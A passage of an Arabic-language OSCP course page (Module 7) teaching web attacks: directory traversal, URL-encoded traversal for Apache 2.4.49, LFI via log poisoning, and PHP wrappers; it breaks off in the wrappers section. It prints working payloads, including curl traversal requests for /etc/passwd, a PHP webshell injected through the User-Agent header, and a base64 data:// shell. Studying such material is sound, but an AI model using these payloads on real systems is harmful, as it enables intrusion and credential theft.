@@ -1,0 +1,733 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>OSCP · Module 7: هجمات تطبيقات الويب الشائعة</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&family=IBM+Plex+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg-0: #0B0B0D;
+    --bg-1: #121214;
+    --surface: #17171A;
+    --surface-2: #1D1D21;
+    --border: #2A2A2F;
+    --border-soft: #232326;
+
+    --text: #E6E6E9;
+    --text-soft: #C4C4CA;
+    --muted: #8A8A92;
+
+    --red: #E1362F;
+    --red-soft: rgba(225,54,47,0.10);
+    --red-border: rgba(225,54,47,0.35);
+    --red-grad: linear-gradient(90deg, #E1362F, #F2794A);
+
+    --amber: #E8A23A;
+    --amber-soft: rgba(232,162,58,0.09);
+    --amber-border: rgba(232,162,58,0.30);
+
+    --green: #3FBF6E;
+
+    --mono: 'IBM Plex Mono', 'Courier New', monospace;
+  }
+
+  * { box-sizing: border-box; }
+
+  html, body {
+    margin: 0;
+    padding: 0;
+    direction: rtl;
+    text-align: right;
+    background: var(--bg-0);
+  }
+
+  body {
+    font-family: 'Cairo', 'Segoe UI', Tahoma, sans-serif;
+    line-height: 1.95;
+    font-size: 16.5px;
+    color: var(--text);
+    background:
+      radial-gradient(900px 420px at 12% -8%, rgba(225,54,47,0.10), transparent 60%),
+      radial-gradient(800px 420px at 90% 6%, rgba(232,162,58,0.06), transparent 60%),
+      linear-gradient(180deg, var(--bg-0) 0%, var(--bg-1) 100%);
+    background-attachment: fixed;
+  }
+
+  .page {
+    max-width: 860px;
+    margin: 0 auto;
+    padding: 46px 22px 100px;
+  }
+
+  .banner {
+    position: relative;
+    overflow: hidden;
+    background: linear-gradient(155deg, #17171A 0%, #141416 55%, #18151A 100%);
+    border: 1px solid var(--border-soft);
+    border-radius: 10px;
+    padding: 0 0 34px;
+    margin-bottom: 26px;
+    box-shadow: 0 20px 50px -20px rgba(0,0,0,0.6);
+  }
+  .term-bar {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    padding: 13px 18px;
+    border-bottom: 1px solid var(--border-soft);
+    background: rgba(255,255,255,0.015);
+    direction: ltr;
+  }
+  .term-dot { width: 11px; height: 11px; border-radius: 50%; display: inline-block; }
+  .term-dot.r { background: #E1362F; }
+  .term-dot.y { background: #E8A23A; }
+  .term-dot.g { background: #3FBF6E; }
+  .term-path {
+    margin-inline-start: 12px;
+    font-family: var(--mono);
+    font-size: 12px;
+    color: var(--muted);
+  }
+  .banner-body { padding: 30px 34px 4px; }
+  .banner .kicker {
+    display: inline-block;
+    font-family: var(--mono);
+    font-size: 12.5px;
+    letter-spacing: 0.03em;
+    color: var(--red);
+    background: var(--red-soft);
+    border: 1px solid var(--red-border);
+    border-radius: 3px;
+    padding: 5px 12px;
+    margin-bottom: 20px;
+    direction: ltr;
+  }
+  .banner h1 {
+    margin: 0 0 14px;
+    font-size: 28px;
+    font-weight: 800;
+    line-height: 1.5;
+    color: #F4F4F6;
+  }
+  .banner .lede {
+    color: var(--muted);
+    font-size: 15.5px;
+    line-height: 1.95;
+    max-width: 620px;
+    margin: 0 0 24px;
+  }
+  .tags { display: flex; flex-wrap: wrap; gap: 9px; }
+  .tag {
+    font-size: 12.5px;
+    font-family: var(--mono);
+    color: var(--amber);
+    background: var(--amber-soft);
+    border: 1px solid var(--amber-border);
+    border-radius: 3px;
+    padding: 5px 11px;
+  }
+
+  .toc {
+    background: var(--surface);
+    border: 1px solid var(--border-soft);
+    border-radius: 8px;
+    padding: 6px 0 6px;
+    margin-bottom: 50px;
+    overflow: hidden;
+  }
+  .toc-title {
+    font-family: var(--mono);
+    font-weight: 600;
+    font-size: 13px;
+    color: var(--green);
+    padding: 14px 22px;
+    border-bottom: 1px solid var(--border-soft);
+    direction: ltr;
+    text-align: left;
+  }
+  .toc-list { display: flex; flex-direction: column; }
+  .toc-item {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    padding: 12px 22px;
+    color: var(--text-soft);
+    text-decoration: none;
+    font-size: 14.5px;
+    border-bottom: 1px solid rgba(255,255,255,0.03);
+    transition: background 0.15s ease, padding-inline-start 0.15s ease;
+  }
+  .toc-list .toc-item:last-child { border-bottom: none; }
+  .toc-item:hover { background: rgba(225,54,47,0.06); }
+  .toc-num {
+    flex: none;
+    font-family: var(--mono);
+    font-size: 12.5px;
+    font-weight: 600;
+    color: #0F0F10;
+    background: var(--red-grad);
+    border-radius: 3px;
+    padding: 3px 8px;
+    direction: ltr;
+  }
+
+  h1, h2, h3, h4 { font-weight: 700; }
+
+  h2 {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    font-size: 21px;
+    margin: 66px 0 22px;
+    padding-bottom: 16px;
+    border-bottom: 1px solid var(--border-soft);
+    color: #F0F0F2;
+  }
+  h2 .num {
+    flex: none;
+    font-family: var(--mono);
+    font-size: 13px;
+    font-weight: 700;
+    color: #0F0F10;
+    background: var(--red-grad);
+    border-radius: 5px;
+    padding: 7px 12px;
+    direction: ltr;
+  }
+  h2 .htext { line-height: 1.5; }
+
+  h3 {
+    font-size: 17px;
+    margin: 34px 0 14px;
+    color: var(--red);
+    display: flex;
+    align-items: center;
+    gap: 9px;
+  }
+  h3::before {
+    content: "#";
+    font-family: var(--mono);
+    color: var(--amber);
+    font-weight: 700;
+  }
+
+  h4 {
+    font-size: 14.8px;
+    margin: 22px 0 10px;
+    color: var(--text-soft);
+    font-family: var(--mono);
+  }
+
+  p { margin: 0 0 17px; color: var(--text); }
+
+  strong { color: #FBFBFC; font-weight: 700; }
+
+  a { color: var(--amber); text-decoration: none; border-bottom: 1px dashed var(--amber-border); }
+
+  hr {
+    border: none;
+    height: 1px;
+    margin: 50px 0;
+    background: linear-gradient(90deg, transparent, var(--border), transparent);
+  }
+
+  ul, ol {
+    margin: 0 0 18px;
+    padding-inline-start: 24px;
+  }
+  li { margin-bottom: 9px; color: var(--text); }
+  li::marker { color: var(--red); font-family: var(--mono); }
+  li > ul, li > ol { margin-top: 9px; }
+
+  blockquote {
+    margin: 24px 0;
+    padding: 17px 22px;
+    background: var(--red-soft);
+    border: 1px solid var(--red-border);
+    border-inline-start: 3px solid var(--red);
+    border-radius: 6px;
+    color: #EAD9D7;
+  }
+  blockquote p { margin: 0; color: inherit; line-height: 1.85; }
+  blockquote strong { color: #FFB4AE; }
+
+  .table-wrap {
+    overflow-x: auto;
+    margin: 22px 0;
+    border: 1px solid var(--border-soft);
+    border-radius: 8px;
+  }
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 14.2px;
+    min-width: 480px;
+  }
+  thead th {
+    background: var(--surface-2);
+    color: var(--amber);
+    font-weight: 700;
+    font-family: var(--mono);
+    font-size: 12.5px;
+    text-transform: uppercase;
+    letter-spacing: 0.02em;
+    text-align: start;
+    padding: 13px 15px;
+    border-bottom: 1px solid var(--border-soft);
+    white-space: nowrap;
+  }
+  tbody td {
+    padding: 12px 15px;
+    border-bottom: 1px solid var(--border-soft);
+    color: var(--text-soft);
+    vertical-align: top;
+  }
+  tbody tr:last-child td { border-bottom: none; }
+  tbody tr:nth-child(even) { background: rgba(255,255,255,0.012); }
+  tbody tr:hover { background: rgba(225,54,47,0.045); }
+
+  code {
+    font-family: var(--mono);
+    font-size: 13.3px;
+    background: var(--surface-2);
+    border: 1px solid var(--border-soft);
+    border-radius: 4px;
+    padding: 2px 6px;
+    direction: ltr;
+    unicode-bidi: embed;
+    color: var(--green);
+  }
+  .code-wrap { overflow-x: auto; margin: 22px 0; }
+  pre {
+    background: #0E0E10;
+    border: 1px solid var(--border-soft);
+    border-inline-start: 3px solid var(--red);
+    border-radius: 8px;
+    padding: 18px 22px;
+    direction: ltr;
+    text-align: left;
+    margin: 0;
+  }
+  pre code {
+    background: none;
+    border: none;
+    padding: 0;
+    color: #B9E8C9;
+    font-size: 13.2px;
+    line-height: 1.75;
+  }
+
+  .footer-note {
+    margin-top: 70px;
+    padding-top: 26px;
+    border-top: 1px solid var(--border-soft);
+    color: var(--muted);
+    font-size: 13.3px;
+    font-family: var(--mono);
+    text-align: center;
+    direction: ltr;
+  }
+
+  @media (max-width: 640px) {
+    .page { padding: 28px 14px 70px; }
+    .banner-body { padding: 24px 20px 4px; }
+    .banner h1 { font-size: 21px; }
+    h2 { font-size: 18px; gap: 10px; }
+  }
+</style>
+</head>
+<body>
+<div class="page">
+
+  <div class="banner">
+    <div class="term-bar">
+      <span class="term-dot r"></span><span class="term-dot y"></span><span class="term-dot g"></span>
+      <span class="term-path">root@oscp:~/module-07$</span>
+    </div>
+    <div class="banner-body">
+      <span class="kicker">OSCP · PEN-200 · Module 07</span>
+      <h1>هجمات تطبيقات الويب الشائعة</h1>
+      <p class="lede">Directory Traversal وتجاوزه بالترميز، File Inclusion (LFI/RFI، Log Poisoning، PHP Wrappers)، ثغرات رفع الملفات (تنفيذية وغير تنفيذية)، وCommand Injection — بسيناريوهات تطبيقية كاملة من البداية للاستغلال.</p>
+      <div class="tags">
+        <span class="tag">directory-traversal</span>
+        <span class="tag">lfi-rfi</span>
+        <span class="tag">php-wrappers</span>
+        <span class="tag">file-upload</span>
+        <span class="tag">command-injection</span>
+      </div>
+    </div>
+  </div>
+
+
+<nav class="toc"><div class="toc-title">$ ls learning_units/</div><div class="toc-list">
+<a class="toc-item" href="#lu1"><span class="toc-num">01</span><span class="toc-label">Directory Traversal</span></a>
+<a class="toc-item" href="#lu2"><span class="toc-num">02</span><span class="toc-label">ثغرات File Inclusion</span></a>
+<a class="toc-item" href="#lu3"><span class="toc-num">03</span><span class="toc-label">ثغرات File Upload</span></a>
+<a class="toc-item" href="#lu4"><span class="toc-num">04</span><span class="toc-label">OS Command Injection</span></a>
+<a class="toc-item" href="#summary"><span class="toc-num">--</span><span class="toc-label">الخلاصة العامة للموديول</span></a>
+</div></nav>
+
+<h1>Module 7: هجمات تطبيقات الويب الشائعة (Common Web Application Attacks)</h1>
+<blockquote>
+<p>تطوير الويب لسه من أكتر المهارات المطلوبة في صناعة الـ IT. مزيج من الطلب العالي على مطورين مهرة، مواعيد مشاريع ضيّقة، وتقنيات سريعة التطوّر غالبًا بيؤدي لعيوب أمنية متكررة عبر تطبيقات ويب كتيرة — بغض النظر عن لغة البرمجة أو الـ framework المستخدَم. الموديول ده بيركّز على 4 أنواع شائعة من هجمات تطبيقات الويب: Directory Traversal، File Inclusion، File Upload، وCommand Injection.</p>
+</blockquote>
+<hr />
+<h2 id="lu1"><span class="num">01</span><span class="htext">Directory Traversal</span></h2>
+<h3>المسارات المطلقة مقابل النسبية (Absolute vs Relative Paths)</h3>
+<p>عشان نستغل الثغرات في الموديول ده، لازم نقدر نحدد مواقع الملفات اللي عايزين نقراها، نرفعها، ندمجها، أو ننفّذها.</p>
+<blockquote>
+<p><strong>المسار المطلق (Absolute Path)</strong> بيحدد الموقع الكامل لملف جوه نظام الملفات، شامل كل الدليل الأب. بما إنه بيبدأ من جذر النظام، يقدر يُستخدم من أي دليل حالي. على أنظمة Linux، المسارات المطلقة بتبدأ بـ <code>/</code> (الجذر). مثال: <code>/etc/passwd</code> بيشتغل بغض النظر عن دليل العمل الحالي.</p>
+<p><strong>المسار النسبي (Relative Path)</strong> بيوصّف موقع ملف بناءً على الدليل الحالي، بدل ما يبدأ من الجذر. التسلسل <code>../</code> بيمثّل الصعود دليل واحد للأعلى في الهرمية. تسلسلات متعددة ممكن تتجمع عشان نرجع لمستويات أكتر.</p>
+</blockquote>
+<p>ممكن كمان نضيف تسلسلات <code>../</code> أكتر من اللازم — بمجرد ما نوصل لدليل الجذر، محاولات الصعود الإضافية مفيهاش تأثير. التقنية دي مفيدة لما الدليل الحالي مش معروف، لأن استخدام خطوات رجوع كتيرة بيضمن الوصول للجذر في النهاية قبل التنقّل للملف المقصود.</p>
+<h3>تحديد واستغلال Directory Traversal</h3>
+<p><strong>Directory Traversal</strong> (أو <strong>Path Traversal</strong>) تقنية هجوم بتسمح للمهاجم يقرأ ملفات من سيرفر المفروض تكون غير قابلة للوصول عادةً. غالبًا بتحصل لما تطبيق ويب يفشل في التحقق من أو تنقية مدخل المستخدم بشكل سليم.</p>
+<p>لما مستخدم يطلب صفحة، سيرفر الويب بيسترجع الملف المقابل من تخزين النظام. الملفات دي عادةً مخزَّنة جوه دليل الـ web root أو المجلدات الفرعية بتاعته — على كتير من سيرفرات Linux، الـ web root الافتراضي موجود في <code>/var/www/html/</code>.</p>
+<p>لو ثغرة directory traversal موجودة، المهاجم ممكن يتلاعب في باراميترات مسار الملف عشان يهرب من web root ويوصل لمواقع تانية على النظام — محتمل يكشف بيانات حساسة زي ملفات إعداد، اعتمادات، أو مفاتيح خاصة.</p>
+<h3>اكتشاف فرص Directory Traversal</h3>
+<p>القدرة على التعرّف على الثغرة دي مهمة بقد استغلالها. أثناء الاختبار، كل جزء من التطبيق لازم يُفحص بعناية:</p>
+<div class="code-wrap"><pre><code>1. مرّر الماوس فوق الأزرار واللينكات
+2. زُر كل الصفحات القابلة للوصول
+3. حلّل الباراميترات في الـ URLs
+4. راجع كود مصدر الصفحة لو ممكن
+</code></pre></div>
+<p>الـ URLs غالبًا بتكشف أدلة مفيدة. مثال:</p>
+<div class="code-wrap"><pre><code>http://target.com/cms/login.php?language=en.html
+</code></pre></div>
+<p>اللينك ده بيوفّر رؤى متعددة:</p>
+<ol>
+<li>وجود <code>login.php</code> بيشير إن التطبيق مبني بـ PHP</li>
+<li>باراميتر <code>language</code> بيشير لملف HTML، مما يوحي إن التطبيق بيحمّل ملفات ديناميكيًا بناءً على مدخل المستخدم</li>
+<li>دليل <code>/cms/</code> بيوضّح إن التطبيق شغّال جوه subfolder مش الجذر</li>
+</ol>
+<p>لو باراميتر بيقبل أسماء ملفات، بيبقى مرشّح أساسي لاختبار traversal باستبدال مسارات ملفات تانية.</p>
+<h3>سيناريو عملي: Mountain Desserts</h3>
+<p>افترض إننا بنحلل تطبيق ويب اسمه <strong>Mountain Desserts</strong>. ملاحظة التنقّل ومعاينات اللينكات بتكشف باراميتر اسمه <code>page</code>:</p>
+<div class="code-wrap"><pre><code>http://mountaindesserts.com/meta/library/change-lang.php?lang=en.php
+</code></pre></div>
+<p>ده بيوحي بقوة إن التطبيق بيحمّل صفحات محتوى مختلفة باستخدام الباراميتر ده (غالبًا متنفَّذ بـ PHP عبر مصفوفة <code>$_GET</code>).</p>
+<p>لو التطبيق بيدمج الملفات مباشرة من غير تحقق، نقدر نجرّب directory traversal بحقن تسلسلات مسار نسبية:</p>
+<div class="code-wrap"><pre><code class="language-bash">curl &quot;http://mountaindesserts.com/meta/library/change-lang.php?lang=../../../../etc/passwd&quot;
+</code></pre></div>
+<p>لو نجح، السيرفر بيرجّع محتوى ملف الباسورد الخاص بـ Linux، مؤكّدًا الثغرة.</p>
+<h3>ليه ده مهم</h3>
+<p>Directory Traversal بيُستخدم بشكل متكرر لكشف المعلومات. المهاجمين بيدوّروا على ملفات تحتوي بيانات قيّمة، بما فيها:</p>
+<p>ملفات الباسورد | ملفات إعداد التطبيق | اعتمادات قاعدة البيانات | مفاتيح SSH الخاصة</p>
+<p>السيرفرات عادةً بتشغّل خدمات الويب تحت حسابات مقيَّدة (مثلًا <code>www-data</code> على Linux). لكن صلاحيات معدَّة بشكل خاطئ أحيانًا بتسمح بقراءة ملفات حساسة.</p>
+<h3>استخدام الأدوات بدل المتصفحات</h3>
+<p>متصفحات الويب غالبًا بتعدّل أو تنسّق الردود لسهولة القراءة، وده ممكن يتداخل مع الاختبار. التقييمات الأمنية عادةً بتعتمد على أدوات زي: <strong>Intercepting proxies</strong> | <strong>Command-line HTTP clients</strong> | <strong>سكربتات مخصَّصة</strong></p>
+<p>الأدوات دي بتوفّر الردود الخام، وده بيسهّل استخراج البيانات الحساسة بدقة.</p>
+<h3>Directory Traversal على أنظمة Windows</h3>
+<p>الاختبار بيختلف شوية على سيرفرات Windows. بدل <code>/etc/passwd</code>، ملف شائع قابل للقراءة يُستخدم للتحقق هو:</p>
+<div class="code-wrap"><pre><code>C:\Windows\win.ini
+</code></pre></div>
+<p>لو الملف ده قدرنا نسترجعه، الثغرة مؤكَّدة. عكس Linux، أنظمة Windows مابتوفّرش طريقة مباشرة لعدّ المستخدمين عبر ملف واحد. عشان كده المهاجمين لازم يجمّعوا معلومات عن سوفت وير السيرفر، الـ framework، والإعداد عشان يحددوا أهداف قيّمة.</p>
+<p>مثلًا، لو السيرفر شغّال Microsoft IIS، ملفات مفيدة ممكن تشمل: أدلة لوجات IIS | ملفات إعداد التطبيق | إعداد web root (<code>web.config</code>)</p>
+<h3>اختلافات الصياغة (Linux مقابل Windows)</h3>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>النظام</th>
+<th>صياغة المسار</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Linux</strong></td>
+<td>شرطة مائلة أمامية: <code>../</code></td>
+</tr>
+<tr>
+<td><strong>Windows</strong></td>
+<td>شرطة مائلة خلفية: <code>..\</code></td>
+</tr>
+</tbody>
+</table></div>
+<blockquote>
+<p>رغم إن الـ URLs عادةً بتستخدم شرطات مائلة أمامية، بعض تطبيقات Windows ممكن تكون عرضة بس لما تُستخدم شرطات خلفية. عشان كده، لازم دايمًا نختبر الصيغتين.</p>
+</blockquote>
+<h3>ملخّص Directory Traversal</h3>
+<p>ثغرات Directory Traversal بتسمح للمهاجمين يتخطوا قيود الوصول المقصودة للملفات ويقروا ملفات عشوائية من السيرفر. الاستغلال الناجح بيعتمد على: تحديد باراميترات بتشير لملفات | التلاعب في تسلسلات المسار للهروب من أدلة مقيَّدة | تحديد معلومات حساسة تقدر تؤدي لاختراق أوسع</p>
+<h3>ترميز الحروف الخاصة</h3>
+<p>بعد ما قوّينا فهمنا لـ directory traversal باستخدام مثال Mountain Desserts، هنطبّق التقنيات دي على سيناريو ثغرة واقعي. أثناء فحص الثغرات، عيب directory traversal اتكتشف في <strong>Apache إصدار 2.4.49</strong> شغّال على جهاز هدف. المشكلة دي ممكن تُستغل بإضافة مسارات نسبية مصمَّمة لأدلة محددة (زي <code>cgi-bin</code>) جوه الـ URL.</p>
+<p>محاولة أولى لاستغلال الثغرة ممكن تشمل استخدام عميل HTTP سطر أوامر وإدخال تسلسلات رجوع للخلف متعددة (<code>../</code>) للوصول لملفات حساسة زي <code>/etc/passwd</code>. لكن المحاولات دي ممكن تفشل لأن الأنماط دي معروفة على نطاق واسع وغالبًا بتتمنع من سيرفرات الويب، WAFs، أو آليات تحقق المدخل جوه التطبيق نفسه.</p>
+<h3>تجاوز الفلاتر بالترميز</h3>
+<p>للتغلب على القيود دي، المهاجمين غالبًا بيعتمدوا على <strong>URL Encoding</strong> (المعروف كمان بـ <strong>Percent Encoding</strong>). الطريقة دي بتحوّل الحروف لصيغة hexadecimal بناءً على قيم ASCII، سامحة بإرسالها بأمان في طلبات الويب.</p>
+<p>مثلًا: حرف النقطة (<code>.</code>) ممكن يترمّز كـ <code>%2e</code>. بالتالي، <code>../</code> ممكن تُمثَّل كـ <code>%2e%2e/</code>.</p>
+<p>باستبدال تسلسل الـ traversal العادي بمكافئه المرمَّز، ممكن نتخطى فلاتر بتكتشف بس النمط غير المرمَّز. لما الطلب المرمَّز يوصل للسيرفر، التطبيق بيفك ترميزه لصورته الأصلية قبل المعالجة. لو آلية الفلترة فشلت تفحص النسخة المفكوكة، محاولة path traversal الخبيثة بتنجح.</p>
+<div class="code-wrap"><pre><code class="language-bash"># مثال: محاولة مرمَّزة لـ CVE-2021-41773 على Apache 2.4.49
+curl &quot;http://target_ip/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd&quot;
+</code></pre></div>
+<p>استخدام الحروف المرمَّزة في المسار ممكن يسمح بالوصول لملفات مقيَّدة. لو الطلب نجح، السيرفر بيرجّع محتوى <code>/etc/passwd</code>، مؤكّدًا الثغرة. ده بيوضّح إزاي الترميز يقدر يحوّل هجوم مرفوض لهجوم ناجح.</p>
+<blockquote>
+<p><strong>ليه الترميز بيشتغل:</strong> URL encoding مصمَّم لأغراض شرعية — ضمان إن الحروف الخاصة تُنقل بأمان في طلبات HTTP. لكنه غالبًا بيتساء استخدامه في الهجمات الأمنية لأن: الفلاتر ممكن تفحص بس المدخل الخام مش الصيغ المرمَّزة | الضوابط الأمنية ممكن تفك الترميز بعد التحقق | طبقات مختلفة من التطبيق ممكن تفسّر الطلب بشكل مختلف</p>
+</blockquote>
+<p>ترميز الحروف الخاصة تقنية قوية لتجاوز تحقق المدخل والفلاتر الأمنية. لما بنختبر ثغرات directory traversal، مهم نجرّب نسختين من الـ payloads، العادية والمرمَّزة، لأن الدفاعات ممكن تمنع واحدة بس منهم.</p>
+<hr />
+<h2 id="lu2"><span class="num">02</span><span class="htext">ثغرات File Inclusion</span></h2>
+<h3>الفرق بين File Inclusion وDirectory Traversal</h3>
+<p>قبل ما ندخل في Local File Inclusion، مهم نميّز بينها وبين Directory Traversal بوضوح، بما إن الثغرتين دول غالبًا بيتلخبطوا حتى عند ممارسين أمان ذوي خبرة. سوء تحديد نوع الثغرة ممكن يضيّع فرص — خاصةً لما الهدف هو تحقيق تنفيذ كود.</p>
+<p><strong>Directory Traversal</strong> بتسمح للمهاجم يقرا ملفات موجودة برّه web root بالتلاعب في مسارات الملفات. <strong>File Inclusion</strong>، بالمقابل، أقوى بكتير لأنها بتخلّي التطبيق يحمّل ملف كجزء من تدفق تنفيذه — يعني الملف المُدمَج بيتعالج من الـ interpreter بتاع السيرفر، مش بس يتعرض.</p>
+<div class="code-wrap"><pre><code>Directory Traversal → قراءة محتوى الملف فقط
+File Inclusion       → تنفيذ الملفات المُدمَجة (محلية أو بعيدة)
+</code></pre></div>
+<p>مثلًا، لو تطبيق PHP عرضة لـ traversal والمهاجم وصل لـ <code>admin.php</code>، السيرفر عادةً هيرجّع كود المصدر. بالمقابل، لو التطبيق عرضة لـ File Inclusion، نفس الملف هيتنفّذ من PHP، منتجًا خرج وقت التشغيل بدل الكود.</p>
+<h3>تحقيق تنفيذ كود عبر LFI: تسميم اللوجات (Log Poisoning)</h3>
+<p>في السيناريو ده، الهدف هو الحصول على <strong>Remote Code Execution</strong> باستغلال عيب LFI. تقنية فعّالة لده هي <strong>Log Poisoning</strong>.</p>
+<blockquote>
+<p><strong>Log Poisoning</strong> بتشمل حقن كود خبيث في ملفات log السيرفر بيكتبها تلقائيًا. لو المهاجم قدر بعدين يدمج ملف الـ log ده عبر ثغرة LFI، الكود المحقون هينفّذ.</p>
+</blockquote>
+<p><strong>العملية بتشتغل لأن:</strong></p>
+<ol>
+<li>سيرفرات الويب بتسجّل بيانات الطلب في ملفات log</li>
+<li>بعض أجزاء اللوجات دي يتحكم فيها المستخدم</li>
+<li>الملفات المُدمَجة بتتنفّذ من التطبيق</li>
+</ol>
+<h3>تحديد بيانات log قابلة للتحكم</h3>
+<p>تخيل سيرفر ويب بيخزّن اللوجات في:</p>
+<div class="code-wrap"><pre><code>/var/log/apache2/access.log
+</code></pre></div>
+<p>إدخالات اللوج عادةً بتحتوي حقول زي: عنوان IP | المورد المطلوب | الطابع الزمني | رأس User-Agent</p>
+<p>حقل <strong>User-Agent</strong> مفيد بشكل خاص لأنه ممكن يتعدّل قبل إرسال طلب. المهاجم يقدر يحقن كود server-side جوه الحقل ده عشان يبقى جزء من ملف اللوج.</p>
+<div class="code-wrap"><pre><code class="language-bash"># حقن كود PHP في رأس User-Agent
+curl -A &quot;&lt;?php system(\$_GET['cmd']); ?&gt;&quot; http://target.com/
+</code></pre></div>
+<p>بمجرد إرسال الطلب، الـ payload بيتخزّن في access log. في النقطة دي: ملف اللوج بيحتوي كود تنفيذي يتحكم فيه المهاجم | ثغرة LFI تقدر تدمج الملف ده | الكود المحقون بينفّذ على السيرفر</p>
+<h3>تنفيذ أوامر عبر اللوج المُدمَج</h3>
+<p>لتحفيز التنفيذ:</p>
+<div class="code-wrap"><pre><code>1. استخدم الباراميتر العرضة للخطر لدمج ملف اللوج المسموم
+2. وفّر باراميتر أمر للكود المحقون
+3. السيرفر بينفّذ الأمر ويرجّع الخرج
+</code></pre></div>
+<div class="code-wrap"><pre><code class="language-bash">curl &quot;http://target.com/index.php?page=../../../../var/log/apache2/access.log&amp;cmd=id&quot;
+</code></pre></div>
+<blockquote>
+<p>لو الأوامر فيها مسافات أو حروف خاصة، تقنيات ترميز (زي استبدال المسافات بـ <code>%20</code>) ممكن تكون مطلوبة لضمان التفسير السليم.</p>
+</blockquote>
+<h3>من تنفيذ الأوامر للوصول لـ Shell</h3>
+<p>بمجرد تحقيق تنفيذ الأوامر، المهاجمين غالبًا بيصعّدوا لـ <strong>reverse shell</strong> عشان يحصلوا على تحكم تفاعلي في النظام:</p>
+<div class="code-wrap"><pre><code>1. ابدأ listener على جهاز المهاجم
+2. نفّذ أمر على الهدف بيتصل رجوع
+3. استقبل جلسة shell بعيدة
+</code></pre></div>
+<p>بـ shell تفاعلي، المهاجم يقدر يتصفح الملفات، يشغّل برامج، ومحتمل يصعّد الصلاحيات.</p>
+<h3>LFI على أنظمة Windows</h3>
+<p>مفهوم الاستغلال مشابه على منصات Windows، لكن مسارات الملفات بتختلف. في بيئات بتستخدم حزم زي XAMPP، لوجات Apache ممكن تكون في:</p>
+<div class="code-wrap"><pre><code>C:\xampp\apache\logs\
+</code></pre></div>
+<p>نفس تقنية التسميم ممكن تتطبّق لو المهاجم يقدر يتحكم في البيانات المُسجَّلة.</p>
+<h3>أبعد من تطبيقات PHP</h3>
+<p>رغم إن ثغرات File Inclusion مرتبطة أكتر بـ PHP، مشاكل مشابهة ممكن توجد في تقنيات server-side تانية: تطبيقات Perl | Classic ASP وASP.NET | Java Server Pages (JSP) | بيئات حديثة زي Node.js</p>
+<p>نهج الاستغلال بيفضل متشابه إلى حد كبير: حقن كود تنفيذي في ملف التطبيق هيدمجه لاحقًا.</p>
+<blockquote>
+<p><strong>Local File Inclusion أخطر بكتير من Directory Traversal</strong> لأنها ممكن تؤدي لاختراق النظام الكامل، مش مجرد كشف معلومات.</p>
+</blockquote>
+<h3>PHP Wrappers</h3>
+<p>PHP بتوفّر protocol wrappers متعددة بتوسّع قدراتها في التعامل مع الملفات. الـ wrappers دي بتسمح للتطبيقات تتفاعل مع أنواع موارد مختلفة وكأنها ملفات قياسية، بما فيها تخزين محلي، مواقع بعيدة، وتدفقات بيانات في الذاكرة.</p>
+<p>من منظور أمني، الـ wrappers دي ممكن تبقى أدوات قوية أثناء الاستغلال. في تطبيقات عرضة للخطر، ممكن تسمح للمهاجمين يتخطوا آليات فلترة المدخل أو يحققوا تنفيذ كود عبر عيوب File Inclusion.</p>
+<h4>php://filter لقراءة كود المصدر</h4>
+<p>الـ wrapper <code>php://filter</code> بيمكّن التلاعب في تدفقات الملفات قبل ما تتعالج. واحد من أقيم استخداماته في الاختبار الأمني هو استرجاع كود المصدر الخام لملفات تنفيذية من غير تنفيذها.</p>
+<p>عادةً، لما ملف PHP بيتدمج، السيرفر بينفّذه ويرجّع الخرج بس. لكن بتطبيق فلاتر ترميز زي Base64، المهاجم يقدر يحصل على المحتوى الأصلي للملف:</p>
+<div class="code-wrap"><pre><code class="language-bash">curl &quot;http://target.com/index.php?page=php://filter/convert.base64-encode/resource=config.php&quot;
+</code></pre></div>
+<p>السيرفر هيـ: يقرا الملف | يرمّز محتواه بـ Base64 | يرجّع البيانات المرمَّزة</p>
+<p>المهاجم بعدين يقدر يفك ترميز سلسلة Base64 محليًا عشان يحصل على كود المصدر الأصلي:</p>
+<div class="code-wrap"><pre><code class="language-bash">echo &quot;&lt;base64_output&gt;&quot; | base64 -d
+</code></pre></div>
+<blockquote>
+<p><strong>ليه ده مهم:</strong> الوصول لكود المصدر ممكن يكشف اعتمادات قاعدة بيانات، مفاتيح API، مسارات ملفات داخلية، منطق التطبيق، ووظائف مخفية. المعلومة دي ممكن تساعد بشكل كبير في استغلال إضافي.</p>
+</blockquote>
+<p>بعد فك الترميز، المهاجم ممكن يكتشف معلومات حساسة مُضمَّنة في الكود، زي تفاصيل اتصال قاعدة البيانات: عنوان السيرفر | اسم المستخدم | الباسورد — الاعتمادات دي ممكن تُعاد استخدامها للوصول لخدمات تانية، بما فيها قواعد بيانات أو آليات دخول بعيد.</p>
+<h4>data:// لتنفيذ الكود</h4>
+<p>بينما <code>php://filter</code> مفيد أساسًا لكشف المعلومات، الـ wrapper <code>data://</code> ممكن يُستغل لتنفيذ كود مباشر. الـ wrapper ده بيسمح بتضمين بيانات مباشرة جوه الطلب وكأنها ملف — المحتوى المُضمَّن ممكن يكون نص عادي أو مرمَّز بـ Base64. لما يُستخدم في ثغرة File Inclusion، التطبيق بيعامل البيانات المُضمَّنة كـ كود تنفيذي.</p>
+<div class="code-wrap"><pre><code class="language-bash">curl &quot;http://target.com/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+&amp;cmd=id&quot;
+</code></pre></div>
+<p>التقنية دي مفيدة بشكل خاص لما: المهاجم مايقدرش يكتب ملفات على السيرفر | تسميم اللوجات مش ممكن | وظيفة الرفع مقيَّدة</p>
+<blockquote>
